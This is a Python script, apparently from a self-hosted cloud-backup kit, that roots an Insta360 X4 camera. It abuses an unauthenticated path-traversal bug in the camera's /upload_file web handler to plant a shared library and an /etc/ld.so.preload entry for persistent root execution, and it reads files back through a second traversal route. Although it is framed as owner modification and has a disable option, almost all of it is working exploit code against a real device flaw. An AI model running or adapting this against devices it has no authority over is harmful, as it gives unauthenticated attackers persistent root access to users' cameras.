#!/usr/bin/env python3
"""One-time X4 bootstrap for the self-hosted cloud-backup kit.

X4 firmware 1.9.21 has the stock /tmp/SD0/bootup.sh hook commented out in
/etc/init.d/S99bootdone.  It also ships an unauthenticated instaAIP web UI on
TCP/80 whose /upload_file multipart handler concatenates the multipart
filename to /tmp/SD0/DCIM/ without sanitising it.  That gives us a
one-time root-file write:

    /tmp/SD0/DCIM/../../../usr/lib/libcloudbootstrap.so
    /tmp/SD0/DCIM/../../../etc/ld.so.preload

The preload library is freestanding and only starts /tmp/SD0/bootup.sh after
instaAIP exists.  Everything else (Tailscale, relay, CA, uploader trigger)
lives on the SD card and is installed with install_to_sd.sh.

This is a firmware modification (two files on the camera's root filesystem),
unlike the X5 SD-only path.  Use --disable to neutralise the preload before
removing the SD card or reflashing stock firmware.
"""

from __future__ import annotations

import argparse
import hashlib
import http.client
import os
import secrets
import sys
import time

LIB_TARGET = "../../../usr/lib/libcloudbootstrap.so"
PRELOAD_TARGET = "../../../etc/ld.so.preload"
LIB_PRELOAD_PATH = "/usr/lib/libcloudbootstrap.so"
PROBE_NAME = ".x4-bootstrap-probe"
PRELOAD_MIN = 1024


class BootstrapError(RuntimeError):
    pass


def http_request(host: str, port: int, method: str, path: str,
                 body: bytes = b"", headers: dict[str, str] | None = None,
                 timeout: float = 20.0) -> tuple[int, bytes, dict[str, str]]:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    h = {"User-Agent": "insta360-x4-bootstrap/1", "Connection": "close"}
    if headers:
        h.update(headers)
    try:
        conn.request(method, path, body=body, headers=h)
        resp = conn.getresponse()
        data = resp.read()
        return resp.status, data, dict(resp.getheaders())
    finally:
        conn.close()


def multipart_body(filename: str, payload: bytes, boundary: str) -> bytes:
    # instaAIP derives the boundary from the first line of the body and finds
    # the filename with strstr(body + 8, "filename").  A normal multipart form
    # is exactly what it expects.
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "\r\n"
    ).encode()
    tail = f"\r\n--{boundary}--\r\n".encode()
    return head + payload + tail


def upload_file(host: str, port: int, filename: str, payload: bytes,
                timeout: float = 20.0) -> tuple[int, bytes]:
    """Set the X4 uploader to file mode and POST one file.

    The handler's success response is HTTP 400 with a short numeric body on
    some firmware revisions, so status alone is not treated as success.
    """
    status, body, _ = http_request(host, port, "GET", "/upload_file",
                                   timeout=timeout)
    if status != 200 or b"Upload File." not in body:
        # The form is gated in a factory-mode/STA combination, but the POST
        # hook itself does not check that gate.  Try the POST; the probe
        # read-back is the real test.
        if b"forbidden" not in body:
            raise BootstrapError(
                f"GET /upload_file was not the expected form (HTTP {status}, "
                f"body={body[:120]!r}). Unplug USB, connect to the camera's "
                "own Wi-Fi AP, and retry this one-time install."
            )

    boundary = "----insta360x4" + secrets.token_hex(12)
    body = multipart_body(filename, payload, boundary)
    status, resp, _ = http_request(
        host, port, "POST", "/upload_file", body,
        {"Content-Type": f"multipart/form-data; boundary={boundary}",
         "Content-Length": str(len(body))},
        timeout=max(timeout, 60.0),
    )
    return status, resp


def read_algorithm(host: str, port: int, suffix: str,
                   timeout: float = 20.0) -> bytes | None:
    """Read a file through instaAIP's /algorithm route, if reachable.

    The route concatenates the URI suffix to /tmp/SD0.  A suffix beginning
    with ../../ therefore reaches /usr/lib or /etc.  The URI is sent exactly
    as written; some evhtp versions normalise it before routing, so this is
    best-effort verification.
    """
    uri = "/algorithm" + (suffix if suffix.startswith("/") else "/" + suffix)
    try:
        status, body, _ = http_request(host, port, "GET", uri,
                                       timeout=timeout)
    except Exception:
        return None
    if status != 200:
        return None
    return body


def probe_upload(host: str, port: int, timeout: float,
                 force: bool = False) -> None:
    token = ("x4-bootstrap " + secrets.token_hex(16) + "\n").encode()
    # The probe is small; pad to the handler's 0x400-byte minimum.
    if len(token) < PRELOAD_MIN:
        token += b"\n" * (PRELOAD_MIN - len(token))
    status, resp = upload_file(host, port, PROBE_NAME, token,
                               timeout=timeout)
    print(f"  probe upload: HTTP {status} {resp[:80]!r}")
    got = read_algorithm(host, port, f"/DCIM/{PROBE_NAME}", timeout=timeout)
    if got != token:
        msg = ("upload probe could not be read back. The camera may have "
               "rejected the traversal, USB may still be active, or its web "
               "UI is not the expected instaAIP handler.")
        if force:
            print(f"  WARNING: {msg} Continuing because --force was given.")
            return
        raise BootstrapError(msg + " Refusing to install the preload.")
    print("  probe read-back: OK")


def verify_file(host: str, port: int, uri_path: str, expected: bytes,
                label: str, timeout: float) -> bool:
    got = read_algorithm(host, port, uri_path, timeout=timeout)
    if got is None:
        print(f"  {label}: uploaded, but read-back route is unavailable "
              "(will not block install)")
        return False
    if hashlib.sha256(got).digest() != hashlib.sha256(expected).digest():
        print(f"  {label}: read-back differs ({len(got)} vs {len(expected)} "
              "bytes); install may be unsafe")
        return False
    print(f"  {label}: read-back OK ({len(got)} bytes, "
          f"sha256 {hashlib.sha256(got).hexdigest()[:16]}...)")
    return True


def install(args: argparse.Namespace) -> int:
    lib_path = args.library or os.path.join(os.path.dirname(__file__),
                                           "libcloudbootstrap.so")
    if not os.path.isfile(lib_path):
        raise BootstrapError(f"missing preload library: {lib_path}")
    lib = open(lib_path, "rb").read()
    if not lib.startswith(b"\x7fELF"):
        raise BootstrapError(f"not an ELF file: {lib_path}")
    if args.dry_run:
        print(f"would upload {lib_path} ({len(lib)} bytes) to "
              f"/usr/lib/libcloudbootstrap.so")
        print(f"would upload {PRELOAD_MIN} bytes to /etc/ld.so.preload")
        print("no network requests made (dry run)")
        return 0

    print(f"camera {args.camera}:{args.port}")
    status, body, _ = http_request(args.camera, args.port, "GET",
                                   "/upload_file", timeout=args.timeout)
    if status != 200 or b"Upload File." not in body:
        if b"forbidden" not in body:
            raise BootstrapError(
                f"camera web UI not usable: HTTP {status}, "
                f"body={body[:160]!r}\n"
                "Unplug USB, connect to the camera's own Wi-Fi AP, and retry."
            )
        print("  /upload_file form is gated; trying the POST path anyway")
    else:
        print("  /upload_file reachable")

    probe_upload(args.camera, args.port, args.timeout, force=args.force)

    print("uploading preload library ...")
    status, resp = upload_file(args.camera, args.port, LIB_TARGET, lib,
                               timeout=args.timeout)
    print(f"  library upload: HTTP {status} {resp[:80]!r}")
    lib_ok = verify_file(args.camera, args.port,
                         "/../../usr/lib/libcloudbootstrap.so", lib,
                         "library", args.timeout)
    if not lib_ok and not args.force:
        raise BootstrapError(
            "the library upload could not be verified; not installing "
            "/etc/ld.so.preload. Re-run with --force only if you accept the "
            "risk of an unbootable root filesystem."
        )

    # ld.so.preload is whitespace/line separated and ignores blank lines.
    # Pad to the handler's 0x400-byte minimum with newlines.
    preload = (LIB_PRELOAD_PATH + "\n").encode()
    preload += b"\n" * max(0, PRELOAD_MIN - len(preload))
    print("installing /etc/ld.so.preload ...")
    status, resp = upload_file(args.camera, args.port, PRELOAD_TARGET,
                               preload, timeout=args.timeout)
    print(f"  preload upload: HTTP {status} {resp[:80]!r}")
    verify_file(args.camera, args.port, "/../../etc/ld.so.preload", preload,
                "preload", args.timeout)

    print()
    print("bootstrap installed.  Power-cycle the camera.")
    print("On the next boot the preload library starts /tmp/SD0/bootup.sh "
          "after instaAIP is up.")
    print("Watch the SD card's bootup.log and the server's requests.log.")
    print("To disable the hook without firmware reflashing, run:")
    print(f"  {sys.argv[0]} --camera {args.camera} --disable")
    return 0


def disable(args: argparse.Namespace) -> int:
    if args.dry_run:
        print("would replace /etc/ld.so.preload with blank lines")
        return 0
    preload = b"\n" * PRELOAD_MIN
    status, resp = upload_file(args.camera, args.port, PRELOAD_TARGET,
                               preload, timeout=args.timeout)
    print(f"preload disable: HTTP {status} {resp[:80]!r}")
    print("The library file remains in /usr/lib but will not be loaded "
          "after the next power-cycle.")
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(
        description="Install the X4 preload bootstrap via instaAIP "
                    "/upload_file.")
    ap.add_argument("--camera", required=True,
                    help="camera IP (its own AP address during setup)")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--library", help="preload .so to upload")
    ap.add_argument("--timeout", type=float, default=20.0)
    ap.add_argument("--force", action="store_true",
                    help="install preload even if read-back checks fail")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--disable", action="store_true",
                    help="blank /etc/ld.so.preload (leaves the .so)")
    args = ap.parse_args(argv)
    try:
        return disable(args) if args.disable else install(args)
    except BootstrapError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
